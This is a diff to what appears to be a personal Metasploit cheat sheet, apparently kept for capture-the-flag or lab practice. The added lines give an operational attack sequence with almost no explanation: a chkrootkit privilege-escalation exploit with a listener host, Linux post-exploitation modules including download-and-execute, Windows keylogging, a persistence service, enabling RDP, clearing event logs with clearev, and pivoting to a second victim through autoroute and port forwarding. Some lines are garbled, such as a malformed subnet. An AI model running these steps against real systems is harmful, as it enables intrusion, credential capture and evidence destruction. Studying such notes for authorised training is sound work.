@@ -4,6 +4,29 @@ sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins
 load db_autopwn
 db_autopwn 
 
+Linux PRIVesc -
+/bin/chkrootkit -V
+use exploit/unix/local/chkrootkit
+set CHKROOTKIT /bin/chkrootkit
+set session 1
+set LHOST 192.60.22.2
+exploit
+cat /root/flag
+
+
+LINUX POST EXPLOTATIN -
+post/linux/gather/enum_configs
+post/multi/gather/env
+post/linux/gather/enum_network
+post/linux/gather/enum_protections
+post/linux/gather/enum_system
+post/linux/gather/checkcontainer
+post/linux/gather/checkvm
+post/linux/gather/enum_users_history
+post/multi/manage/system_session
+post/linux/manage/download_exec
+
+
 UAC BYPASS -
 net localgroup administrators // shows admins
 bypassuac module_injection 
@@ -19,10 +42,28 @@ set SMBPass to hash
 set SMBUser to user
 
 WINDOWS POST EXP -
+enable_rdp // net user administrator password
+keyscan_start //keyscan dump
+window/local/persistance_service // set up multi handler with same payload and LPORT
 post/windows/gather/enum_shares
 post/windows/gather/enum_computers
 post/windows/gather/enum_applications
 post/windows/gather/checkvm
+clearev // clears logs from meterpreter
+
+Pivoting WIndows -
+run autoroute -s ip 10.10.10.0shell/255.255.255.240.0 // use comprimised taget ip with network address and use correct subnet// use ipconfig to find subnet
+sessions -n victim-1 -i 1
+search portscan // use auxiliary/scanner/portscan/tcp 
+sessions -victim-1
+portfwd add -l 1234 -p 80 -r victim2ip
+db_nmap -sS -sV -p 1234 localhost
+use exploit
+set payload windows/meterpreter/bind_tcp
+set RHOSTS victim2ip
+set LPORT to new port
+run //should get new meterpreter sesssion on victim 2// rename session to victim2
+
 
 WMAP -
 load wmap 
@@ -152,6 +193,9 @@ nmap -Pn -p- -sC -sV (IP) -vvv -oA nmap_full
 
 WINDOWS -
 dir C:\Windows\System32\*.txt /s /b  //shows all files that end with txt
+dir C:\flag.txt /s /b
+where /r C:\ flag.txt
+
 
 SHELL UPGRADES -
 use multi/manage/shell_to_meterpreter
